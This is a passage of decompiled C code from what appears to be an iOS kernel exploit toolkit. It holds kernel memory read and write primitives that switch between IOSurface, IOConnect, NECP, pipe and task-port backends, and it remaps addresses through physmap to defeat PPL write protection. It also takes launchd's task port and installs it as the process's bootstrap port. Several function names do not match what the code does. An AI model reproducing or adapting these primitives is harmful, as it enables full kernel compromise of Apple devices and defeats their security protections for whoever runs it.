    uint64_t tableBase = krwCtx->gap_0x1F0;
    uint64_t stride = krwCtx->gap_0x1F8;
    if ( tableBase && (uint32_t)stride )
      return tableBase + (a2 & 0x7FFFFFFF) * stride;
    return 0;
  }

  int shift = 0;
  uint64_t base = kernel_va_base_resolver(krwCtx, 0, &shift);
  if ( base )
    base += (uint64_t)a2 << shift;
  return base;
}

//----- (000000000002A200) ----------------------------------------------------
unsigned __int64 __fastcall decode_pte_to_physmap_addr(struct_krwCtx *krwCtx, unsigned __int64 a2, uint32_t *a3)
{
  if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) )
  {
    bool isNewEncoding = krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8792, 80, 24, 1023, 1023);
    bool hasWideKernelVa = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_HIGH_CORE_CLUSTER)
                        || krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A16_A17_MASK);
    uint64_t pteAddressMask;
    uint64_t fallbackPteAddressMask;
    uint64_t physmapBase;
    uint8_t selectorShift;

    if ( hasWideKernelVa )
    {
      pteAddressMask = isNewEncoding ? -32LL : 0xFFFF9FFFFFFFFFF0LL;
      fallbackPteAddressMask = isNewEncoding ? 0xFFFFBFFFFFFFC000LL : 0xFFFF9FFFFFFFC000LL;
      selectorShift = isNewEncoding ? 46 : 45;
      physmapBase = isNewEncoding ? 0x400000000000LL : 0x600000000000LL;
    }
    else
    {
      pteAddressMask = isNewEncoding ? -32LL : 0xFFFFFF9FFFFFFFF0LL;
      fallbackPteAddressMask = isNewEncoding ? 0xFFFFFFBFFFFFC000LL : 0xFFFFFF9FFFFFC000LL;
      selectorShift = isNewEncoding ? 38 : 37;
      physmapBase = isNewEncoding ? 0x4000000000LL : 0x6000000000LL;
    }

    uint64_t selectorMask = isNewEncoding ? 1 : 3;
    uint64_t selector = selectorMask & (a2 >> selectorShift);
    uint32_t decodedBits;
    if ( selector )
    {
      if ( isNewEncoding )
        decodedBits = ((a2 & 0x10) | 0x20) << (a2 & 0xF);
      else
        decodedBits = selector << (a2 & 0xF);
    }
    else
    {
      decodedBits = ((uint32_t)a2 << 14) & 0xFFFC000;
      pteAddressMask = fallbackPteAddressMask;
    }

    *a3 = decodedBits;
    return (pteAddressMask & a2) | physmapBase;
  }

  uint32_t decodedBits = (uint16_t)(a2 >> 16);
  if ( (a2 & 0x800000000000LL) != 0 )
    decodedBits <<= 14;
  *a3 = decodedBits;
  return a2 | 0xFFFF800000000000LL;
}

//----- (000000000002A360) ----------------------------------------------------
bool __fastcall kreadbuf_universal(struct_krwCtx *krwCtx, unsigned __int64 vaddr, mach_vm_size_t size, void *outBuf, __int64 a5)
{
  __int64 (__fastcall *customKread)(struct_krwCtx *, unsigned __int64, void *, mach_vm_size_t, __int64);
  int rawStatus;

  customKread = *(__int64 (__fastcall **)(struct_krwCtx *, unsigned __int64, void *, mach_vm_size_t, __int64))&krwCtx->iogpuKreadFn;
  if ( customKread )
    return customKread(krwCtx, vaddr, outBuf, size, a5) == 0;

  if ( krwCtx->threadForKernelRead + 1 >= 2 && *(uint64_t *)&krwCtx->threadStateKrwPhysAddr )
  {
    rawStatus = kreadbuf_via_dev_null_and_thread_state(krwCtx, vaddr, (__int64)outBuf, size, a5);
  }
  else if ( (unsigned int)(*(uint32_t *)&krwCtx->ioConnectPort + 1) >= 2
         && *(uint64_t *)&krwCtx->ioConnectMappedAddr
         && *(uint64_t *)&krwCtx->ioConnectMappedSize )
  {
    rawStatus = kreadbuf_via_IOConnectCallMethod(krwCtx, vaddr, (__int64)outBuf, size, a5);
  }
  else if ( krwCtx->krw_pipe_0 != -1
         && krwCtx->krw_pipe_1 != -1
         && krwCtx->iosurfaceFd != -1
         && krwCtx->gap_0x218 )
  {
    rawStatus = kreadbuf_via_dev_null_only(krwCtx, vaddr, (__int64)outBuf, size, a5);
  }
  else if ( krwCtx->krw_pipe_0 != -1
         && krwCtx->krw_pipe_1 != -1
         && krwCtx->pipeFd0 != -1
         && krwCtx->pipeFd1 != -1 )
  {
    rawStatus = kreadbuf_via_dev_null_simple(krwCtx, vaddr, outBuf, size, a5);
  }
  else
  {
    return kreadbuf_via_tfp0(
             krwCtx->targetAndParentTaskPorts,
             vaddr,
             size,
             (unsigned int)krwCtx->vmMapSize,
             (__int64)outBuf,
             0) == 0;
  }

  return rawStatus == 0;
}

//----- (000000000002A480) ----------------------------------------------------
bool __fastcall kreadbuf_0(__int64 krwCtx, unsigned __int64 addr, mach_vm_size_t size, void *outBuf)
{
  return kreadbuf_universal(KRWCTX_FROM_UINTPTR(krwCtx), addr, size, outBuf, 0);
}

//----- (000000000002A488) ----------------------------------------------------
bool __fastcall noppl_kwritebuf(struct_krwCtx *krwCtx, unsigned __int64 a2, const void *a3, mach_vm_size_t a4, int a5)
{
  __int64 (__fastcall *customKwrite)(struct_krwCtx *, unsigned __int64, const void *, mach_vm_size_t, int);
  int rawStatus;

  TRACE_PORTS("noppl_kwritebuf enter ctx=%llx addr=%llx buf=%llx size=%llx a5=%d fn=%llx sptm_fd=%d sptm_ctx=%llx shm_port=%d shm_u=%llx shm_k=%llx necp_r=%d necp_w=%d pipe0=%d pipe1=%d iosurface_fd=%d necp=%llx tfp=%d chunk=%u\n",
              (unsigned long long)krwCtx,
              (unsigned long long)a2,
              (unsigned long long)a3,
              (unsigned long long)a4,
              a5,
              (unsigned long long)krwCtx->iogpuKwriteFn,
              krwCtx->threadForKernelRead,
              (unsigned long long)krwCtx->threadStateKrwPhysAddr,
              krwCtx->ioConnectPort,
              (unsigned long long)krwCtx->ioConnectMappedAddr,
              (unsigned long long)krwCtx->ioConnectMappedSize,
              krwCtx->krw_pipe_0,
              krwCtx->krw_pipe_1,
              krwCtx->pipeFd0,
              krwCtx->pipeFd1,
              krwCtx->iosurfaceFd_size4,
              (unsigned long long)krwCtx->gap_0x218,
              krwCtx->targetVmPort,
              krwCtx->vmMapSize_size4);

  customKwrite = (__int64 (__fastcall *)(struct_krwCtx *, unsigned __int64, const void *, mach_vm_size_t, int))krwCtx->iogpuKwriteFn;
  if ( customKwrite )
  {
    rawStatus = customKwrite(krwCtx, a2, a3, a4, a5);
    TRACE_PORTS("noppl_kwritebuf backend=custom raw=%x\n", rawStatus);
  }
  else if ( (unsigned int)(krwCtx->threadForKernelRead + 1) >= 2 && krwCtx->threadStateKrwPhysAddr )
  {
    rawStatus = iosurface_physmap_kwrite(krwCtx, a2, (__int64)a3, a4, a5);
    TRACE_PORTS("noppl_kwritebuf backend=sptm raw=%x\n", rawStatus);
  }
  else if ( (unsigned int)(krwCtx->ioConnectPort + 1) >= 2 && krwCtx->ioConnectMappedAddr && krwCtx->ioConnectMappedSize )
  {
    rawStatus = ioconnect_callmethod_write(krwCtx, a2, (__int64)a3, a4, a5);
    TRACE_PORTS("noppl_kwritebuf backend=ioconnect raw=%x\n", rawStatus);
  }
  else if ( krwCtx->krw_pipe_0 != -1
         && krwCtx->krw_pipe_1 != -1
         && krwCtx->iosurfaceFd_size4 != -1
         && krwCtx->gap_0x218 )
  {
    rawStatus = necp_ioconnect_krw(krwCtx, a2, (__int64)a3, a4, a5);
    TRACE_PORTS("noppl_kwritebuf backend=necp raw=%x\n", rawStatus);
  }
  else if ( krwCtx->krw_pipe_0 != -1
         && krwCtx->krw_pipe_1 != -1
         && krwCtx->pipeFd0 != -1
         && krwCtx->pipeFd1 != -1 )
  {
    rawStatus = pipe_pair_krw(krwCtx, a2, a3, a4, a5);
    TRACE_PORTS("noppl_kwritebuf backend=pipe raw=%x\n", rawStatus);
  }
  else
  {
    rawStatus = mach_vm_read_with_attr_chunks(krwCtx->targetVmPort, a2, (__int64)a3, a4, krwCtx->vmMapSize_size4);
    TRACE_PORTS("noppl_kwritebuf backend=tfp raw=%x ok=%d\n", rawStatus, rawStatus == 0);
    return rawStatus == 0;
  }

  TRACE_PORTS("noppl_kwritebuf exit raw=%x ok=%d\n", rawStatus, rawStatus == 0);
  return rawStatus == 0;
}

//----- (000000000002A56C) ----------------------------------------------------
bool __fastcall kwritebuf_last_0(struct_krwCtx *krwCtx, unsigned __int64 a2, const void *a3, mach_vm_size_t a4)
{
  return noppl_kwritebuf(krwCtx, a2, a3, a4, 0);
}

//----- (000000000002A574) ----------------------------------------------------
mach_vm_address_t __fastcall ppl_kwrite32(struct_krwCtx *krwCtx, mach_vm_address_t a2, int a3)
{
  if ( krwCtx->xnuVersionPacked < XNU_VERSION_PACKED(8019, 60, 40, 0, 0) )
    return noppl_kwrite32(krwCtx, a2, a3);

  int newBytes = a3;
  if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) )
    return ppl_kwritebuf(krwCtx, a2, &newBytes, 4);

  mach_vm_address_t remappedAddr = remap_kaddr_through_physmap(krwCtx, a2);
  if ( !remappedAddr )
    return 0;
  return noppl_kwrite32(krwCtx, remappedAddr, a3);
}

//----- (000000000002A63C) ----------------------------------------------------
int kwrite64_dispatch(struct_krwCtx *krwCtx, mach_vm_address_t address, __int64 new_value)
{
  if ( krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(8019, 60, 40, 0, 0) )
  {
    if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) )
      return ppl_kwrite_physmap_checked(krwCtx, address, new_value);

    uint64_t remappedAddress = remap_kaddr_through_physmap(krwCtx, address);
    if ( !remappedAddress )
      return 0;
    address = remappedAddress;
  }

  return kwrite64_last_arg(krwCtx, address, new_value, krwCtx->gap_0xC);
}

//----- (000000000002A714) ----------------------------------------------------
unsigned __int64 __fastcall kwritebuf_universal(
        struct_krwCtx *krwCtx,
        unsigned __int64 vaddr,
        const void *newBytes,
        mach_vm_size_t length)
{
  if ( krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(8019, 60, 40, 0, 0) )
  {
    if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) )
      return ppl_kwritebuf(krwCtx, vaddr, (void *)newBytes, length);

    uint64_t remappedAddress = remap_kaddr_through_physmap(krwCtx, vaddr);
    if ( !remappedAddress )
      return 0;
    vaddr = remappedAddress;
  }
  return noppl_kwritebuf(krwCtx, vaddr, newBytes, length, 1);
}

//----- (000000000002A7F4) ----------------------------------------------------
__int64 __fastcall mach_vm_read_with_attr_chunks(
        vm_map_t target_task,
        mach_vm_address_t address,
        __int64 a3,
        mach_vm_size_t size,
        unsigned int a5)
{
  uint32_t totalSize = size;
  uint32_t maxChunkSize = a5 ? a5 : totalSize;
  uint32_t remaining = totalSize;
  uint32_t offset = 0;

  while ( remaining )
  {
    mach_msg_type_number_t chunkSize = remaining >= maxChunkSize ? maxChunkSize : remaining;
    kern_return_t kr = mach_vm_write(target_task, address + offset, a3 + offset, chunkSize);
    if ( kr )
      return kr;
    offset += chunkSize;
    remaining -= chunkSize;
  }

  vm_machine_attribute_val_t value = 7;
  mach_vm_machine_attribute(target_task, address, totalSize, 1u, &value);
  return 0;
}

//----- (000000000002A8A4) ----------------------------------------------------
__int64 __fastcall pgtable_write_aligned(struct_krwCtx *krwCtx)
{
  if ( !krwCtx )
    return 708609;
  if ( bootstrap_port + 1 > 1 )
    return 0;

  __int64 status = 163843;
  mach_port_name_t launchdTaskPort = 0;
  if ( krw_task_for_pid(krwCtx, 1, &launchdTaskPort) )
  {
    ipc_info_space_t space_info;
    ipc_info_name_array_t table_info = 0;
    mach_msg_type_number_t table_infoCnt = 0;
    ipc_info_tree_name_array_t tree_info = 0;
    mach_msg_type_number_t tree_infoCnt = 0;
    memset(&space_info, 0, sizeof(space_info));
    kern_return_t kr = mach_port_space_info(launchdTaskPort, &space_info, &table_info, &table_infoCnt, &tree_info, &tree_infoCnt);
    if ( kr )
    {
      status = kr | 0x80000000;
    }
    else if ( table_infoCnt )
    {
      for ( mach_msg_type_number_t i = 0; i < table_infoCnt; ++i )
      {
        integer_t portAttributes[17] = {0};
        mach_msg_type_number_t portAttributesCnt = 17;
        mach_port_name_t name = table_info[i].iin_name;

        if ( (table_info[i].iin_type & 0x1F0000) != 0 && name + 1 >= 2 )
        {
          kr = mach_port_get_attributes(launchdTaskPort, name, 7, portAttributes, &portAttributesCnt);
          if ( !kr && portAttributes[3] == 128 && (~*((uint8_t *)portAttributes + 36) & 6) == 0 )
          {
            uint64_t portKobject = task_get_ipc_port(krwCtx, launchdTaskPort, name);
            if ( portKobject )
            {
              status = plist_elem_is_string_6(krwCtx, portKobject, &bootstrap_port);
              if ( !(uint32_t)status )
              {
                kr = task_set_special_port(mach_task_self_, 4, bootstrap_port);
                status = kr ? kr | 0x80000000 : 0;
              }
            }
            break;
          }
        }
      }
    }

    if ( table_info && table_infoCnt )
      mach_vm_deallocate(mach_task_self_, (mach_vm_address_t)table_info, 28LL * table_infoCnt);
    if ( tree_info && tree_infoCnt )
      mach_vm_deallocate(mach_task_self_, (mach_vm_address_t)tree_info, 36LL * tree_infoCnt);
    mach_port_deallocate(mach_task_self_, launchdTaskPort);
  }
  return status;
}

//----- (000000000002AABC) ----------------------------------------------------
__int64 __fastcall semaphore_timedwait_ns(__int64 a1, unsigned int a2)
{
  mach_timespec_t timeout = IDA_MACH_TIMESPEC((a2 / 0xF4240uLL) & 0x7FFFFFFFFLL
                                            | ((unsigned __int64)((125 * (a2 % 0xF4240)) & 0x1FFFFFFF) << 35));
  return semaphore_timedwait(*(uint32_t *)(a1 + 612), timeout) == 49 ? 0 : 0xFFFFFFFFLL;
}

//----- (000000000002AB10) ----------------------------------------------------
__int64 vtable_trampoline_b()
{
  return 0LL;
}
